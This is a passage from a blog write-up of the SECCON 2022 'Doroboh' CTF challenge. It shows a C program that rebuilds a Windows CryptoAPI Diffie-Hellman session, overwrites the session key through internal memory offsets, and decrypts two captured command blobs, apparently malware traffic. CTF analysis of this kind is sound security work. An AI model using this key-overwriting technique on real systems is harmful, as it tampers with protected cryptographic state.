  <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span>
  <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span>
  <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span>
  <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span>
  <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span>
  <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span>
  <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span>
  <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7c</span>
<span class="p">};</span>

<span class="k">static</span> <span class="k">const</span> <span class="n">BYTE</span> <span class="n">extractedKey</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span>
  <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0xA3</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">HANDLE</span> <span class="n">hHeap</span><span class="p">;</span>
  <span class="n">DATA_BLOB</span> <span class="n">P</span><span class="p">,</span> <span class="n">G</span><span class="p">;</span>
  <span class="n">PBYTE</span> <span class="n">pbKeyBlob</span><span class="p">;</span>
  <span class="n">HCRYPTPROV</span> <span class="n">hCryptProv1</span><span class="p">,</span> <span class="n">hCryptProv2</span><span class="p">;</span>
  <span class="n">HCRYPTKEY</span>  <span class="n">hCryptKey1</span><span class="p">,</span> <span class="n">hCryptKey2</span><span class="p">,</span> <span class="n">hSessionKey</span><span class="p">;</span>

  <span class="n">P</span><span class="p">.</span><span class="n">cbData</span> <span class="o">=</span> <span class="n">DHKEYSIZE</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
  <span class="n">P</span><span class="p">.</span><span class="n">pbData</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)(</span><span class="n">g_P</span><span class="p">);</span>
  <span class="n">G</span><span class="p">.</span><span class="n">cbData</span> <span class="o">=</span> <span class="n">DHKEYSIZE</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
  <span class="n">G</span><span class="p">.</span><span class="n">pbData</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)(</span><span class="n">g_G</span><span class="p">);</span>

  <span class="cm">/* Create DH container */</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContext</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hCryptProv1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
                           <span class="n">MS_ENH_DSS_DH_PROV</span><span class="p">,</span>
                           <span class="n">PROV_DSS_DH</span><span class="p">,</span>
                           <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContext</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hCryptProv2</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
                           <span class="n">MS_ENH_DSS_DH_PROV</span><span class="p">,</span>
                           <span class="n">PROV_DSS_DH</span><span class="p">,</span>
                           <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

  <span class="cm">/* Create a new key */</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptGenKey</span><span class="p">(</span><span class="n">hCryptProv1</span><span class="p">,</span>
                   <span class="n">CALG_DH_EPHEM</span><span class="p">,</span>
                   <span class="n">DHKEYSIZE</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span> <span class="o">|</span> <span class="n">CRYPT_EXPORTABLE</span> <span class="o">|</span> <span class="n">CRYPT_PREGEN</span><span class="p">,</span>
                   <span class="o">&amp;</span><span class="n">hCryptKey1</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptGenKey</span><span class="p">(</span><span class="n">hCryptProv2</span><span class="p">,</span>
                   <span class="n">CALG_DH_EPHEM</span><span class="p">,</span>
                   <span class="n">DHKEYSIZE</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span> <span class="o">|</span> <span class="n">CRYPT_EXPORTABLE</span> <span class="o">|</span> <span class="n">CRYPT_PREGEN</span><span class="p">,</span>
                   <span class="o">&amp;</span><span class="n">hCryptKey2</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

  <span class="cm">/* Set P and G, generate X */</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">hCryptKey1</span><span class="p">,</span> <span class="n">KP_P</span><span class="p">,</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">hCryptKey1</span><span class="p">,</span> <span class="n">KP_G</span><span class="p">,</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">G</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">hCryptKey1</span><span class="p">,</span> <span class="n">KP_X</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">hCryptKey2</span><span class="p">,</span> <span class="n">KP_P</span><span class="p">,</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">hCryptKey2</span><span class="p">,</span> <span class="n">KP_G</span><span class="p">,</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">G</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">hCryptKey2</span><span class="p">,</span> <span class="n">KP_X</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

  <span class="cm">/* Retrieve public key */</span>
  <span class="n">DWORD</span> <span class="n">dwDataLen</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptExportKey</span><span class="p">(</span><span class="n">hCryptKey2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PUBLICKEYBLOB</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwDataLen</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">pbKeyBlob</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">dwDataLen</span><span class="p">)))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptExportKey</span><span class="p">(</span><span class="n">hCryptKey2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PUBLICKEYBLOB</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pbKeyBlob</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwDataLen</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

  <span class="cm">/* Import key */</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptImportKey</span><span class="p">(</span><span class="n">hCryptProv1</span><span class="p">,</span> <span class="n">pbKeyBlob</span><span class="p">,</span> <span class="n">dwDataLen</span><span class="p">,</span>
                      <span class="n">hCryptKey1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hSessionKey</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

  <span class="cm">/* Now key is shared */</span>
  <span class="n">ALG_ID</span> <span class="n">algid</span> <span class="o">=</span> <span class="n">CALG_RC4</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">hSessionKey</span><span class="p">,</span> <span class="n">KP_ALGID</span><span class="p">,</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">algid</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">enckey</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="o">*</span><span class="p">)(((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">hSessionKey</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] encrypted pointer = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">enckey</span><span class="p">);</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">ptr_secret</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">enckey</span> <span class="o">^</span> <span class="mh">0xA2491D83D96214A0ULL</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] secret @ %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ptr_secret</span><span class="p">);</span>
  <span class="c1">// assert (*(u64*)ptr_secret == 0xbadf) // magic number</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="n">ptr_secret</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">));</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] key @ %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">extractedKey</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Successfully overwritten secret!"</span><span class="p">);</span>

  <span class="n">DWORD</span> <span class="n">dwLength</span><span class="p">;</span>

  <span class="cm">/* Decrypt command 1 */</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cmd1</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">};</span>
  <span class="n">dwLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hSessionKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cmd1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwLength</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">dwLength</span> <span class="o">=</span> <span class="mh">0x67</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hSessionKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cmd1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwLength</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">cmd1</span><span class="p">);</span>

  <span class="cm">/* Decrypt command 2 */</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cmd2</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">};</span>
  <span class="n">dwLength</span> <span class="o">=</span> <span class="mh">0x66</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hSessionKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cmd2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwLength</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">cmd2</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(CTF) 2022 Seccon Doroboh writeup - snwo&url=http://blog.solidity.kr/posts/doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(CTF) 2022 Seccon Doroboh writeup - snwo&u=http://blog.solidity.kr/posts/doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(CTF) 2022 Seccon Doroboh writeup - snwo&url=http://blog.solidity.kr/posts/doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/(ctf)-sonic-jailbreak-hackathon/">(CTF) Sonic Jailbreak hackathon writeup</a><li><a href="/posts/(ctf)-bi0s-ctf-2025/">(CTF) bi0s CTF 2025 writeup (blockchains)</a><li><a href="/posts/(ctf)-2024-eth-escape-ctf/">(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)</a><li><a href="/posts/(ctf)-2024-blazCTF/">(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)</a><li><a href="/posts/(ctf)-2024-SekaiCTF/">(CTF) SekaiCTF 2024 writeup (ZOO)</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web3/">web3</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/(ctf)-2023-seetf/"><div class="card-body"> <em class="timeago small" date="2023-06-12 15:40:13 +0900" >Jun 12, 2023</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) SEETF CTF 2023 NOW, Murky SEEPass writeup</h3><div 